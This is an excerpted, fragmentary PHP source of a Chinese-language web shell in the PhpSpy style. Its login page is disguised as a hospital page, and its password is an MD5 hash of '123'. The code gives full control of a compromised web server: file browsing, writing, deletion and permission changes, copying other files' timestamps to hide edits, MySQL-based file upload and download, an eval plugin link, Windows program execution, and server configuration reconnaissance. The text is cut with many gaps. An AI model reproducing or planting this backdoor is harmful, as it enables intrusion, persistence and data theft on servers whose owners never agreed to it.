...
$admin['check'] = true;
// 如果需要密码验证,请修改登陆密码
$admin['pass']  = '202cb962ac59075b964b07152d234b70'; //123
...
if ($action == "logout") {
	...
	p('<a style="font:12px Verdana" href="'.$self.'">老板再见,欢迎随时来打胎.</a>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == md5($password)) {
			...
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">欢迎光临重庆协和女子医院打胎部..</a>');
			exit;
		}
	}
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="alt1">
		<td><span style="float:right;">Safe Mode:<?php echo getcfg('safe_mode');?></span>
			...
			<a href="javascript:goaction('phpenv');">PHP变量</a> | 
...
if (!$action || $action == 'file') {
	...
	// 判断读写情况
	$dir_writeable = @is_writable($nowpath) ? '可写' : 'Non-writable';
	...
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			...
			m('删除目录 '.(deltree($thefile) ? basename($thefile).' 成功' : '失败'));
		}
	}
	...
	elseif ($newdirname) {
		...
		if (file_exists($mkdirs)) {
			...
			m('新建目录 '.(@mkdir($mkdirs,0777) ? '成功' : '失败'));
			@chmod($mkdirs,0777);
		}
	}
	...
	elseif ($editfilename && $filecontent) {
		...
		m('新建文件 '.(@fwrite($fp,$filecontent) ? '成功' : '失败'));
		@fclose($fp);
	}
	...
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			...
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? '成功' : '失败'));
		}
	}
	...
	elseif ($oldname && $newfilename) {
		...
		if (file_exists($nname) || !file_exists($oldname)) {
			...
			m(basename($oldname).' 重命名为 '.basename($nname).(@rename($oldname,$nname) ? ' 成功' : '失败'));
		}
	}
	...
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			...
			m(basename($tofile).' 复制 '.(@copy($sname,$tofile) ? basename($tofile).' 成功' : '失败'));
		}
	}
	...
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			...
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? '成功' : '失败'));
		}
	}
	...
	elseif($doing == 'delfiles') {
		if ($dl) {
			...
			m('删除文件完成,选择 '.count($dl).' 成功 '.$succ.' 失败 '.$fail);
		} else {
			m('Please select file(s)');
		}
	}
	...
	p('<h2>文件管理 - 当前磁盘剩余空间 '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
...
function getsize(getdir,dir){
  ...
  <?php
	...
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="上传" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div></form>');
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">Web根目录</a>');
	p(' | <a href="javascript:godir(\'.\');">本程序目录</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\');">查看所有文件</a>');
	p(' | 查看可写 ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">目录</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">文件</a> )');
	p(' | <a href="javascript:createdir();">新建目录</a> | <a href="javascript:createfile(\''.$nowpath.'\');">新建文件</a>');
	if (IS_WIN && IS_COM) {
	...
	p('<br /><form action="'.$self.'" method="POST">在文件中查找字符串(当前文件夹): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="查找" type="submit" /> 类型: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></td></tr>');

	p('<tr class="head"><td>&nbsp;</td><td>文件名</td><td width="16%">修改时间</td><td width="10%">大小</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
	...
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			...
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'你确定要删除 <'.$dirdb['filename'].'>? \\n\\nI Love You All In This Life,Cc..\')">删除</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">重命名</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class='.bg().'>');
				p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">返回上级目录</a></td>');
				p('</tr>');
			}
		}
	}
	...
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			...
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">修改文件时间</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">打包下载选中文件</a> - <a href="javascript:dofile(\'delfiles\');">删除选中文件</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir
...
<?php
	...
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	formhead(array('title'=>'MYSQL信息','name'=>'dbinfo'));
	...
	p('<h2>上传文件</h2>');
	p('<p><b>此操作的DB用户必须具有FILE权限.</b></p>');
	p('<p>保存路径(完整路径): <input class="input" name="savepath" size="45" type="text" /> 选择一个文件: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">上传</a></p>');
	p('<h2>下载文件</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">下载</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
							...
							switch(qy($query))
							{
								...
								case 1:
									...
									while($mn = @mysql_fetch_assoc($result)){
										...
										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">编辑</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">删除</a></td>');
...
elseif ($action == 'eval') {
	...
	p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">获取插件</a></p>');
	formfooter();
}//end eval
...
elseif ($action == 'editfile') {
	...
	formhead(array('title'=>'创建 / 编辑 文件'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'当前文件（导入新的文件名称和新的文件）','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'文件内容','name'=>'filecontent','value'=>$contents));
	formfooter();
...
elseif ($action == 'newtime') {
	...
	formhead(array('title'=>'克隆文件的最后修改时间'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'修改文件','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'参考文件 (完整路径)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'最后修改设置'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'当前文件 (完整路径)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
...
elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		...
		makeinput(array('title'=>'程序路径','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'参数','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'执行'));
		p('</p>');
		formfoot();
	}
...
elseif ($action == 'phpenv') {
	...
	$info = array(
		...
		2 => array('服务器域名',$_SERVER['SERVER_NAME']),
		3 => array('服务器IP地址',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('服务器操作系统',PHP_OS),
		...
		10 => array('PHP版本',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('服务器管理员',$adminmail),
		14 => array('允许使用URL打开文件',getcfg('allow_url_fopen')),
		15 => array('允许动态加载链接库',getcfg('enable_dl')),
		16 => array('显示错误信息',getcfg('display_errors')),
		17 => array('自动定义全局变量',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('程序最多允许使用内存量',getcfg('memory_limit')),
		20 => array('POST最大字节数',getcfg('post_max_size')),
		21 => array('允许最大上传文件',$upsize),
		22 => array('程序最长运行时间',getcfg('max_execution_time').' second(s)'),
		23 => array('被禁用的函数',$dis_func),
	);
	...
	makeinput(array('title'=>'请输入PHP配置参数（例如：magic_quotes_gpc设置）','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
...
?>
	...
	<span style="font:11px Verdana;">重庆协和女子医院打胎部: </span><input name="password" type="password" size="20">
...
function goback(){
	global $self, $nowpath;
	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="返回"></p></form>');
}
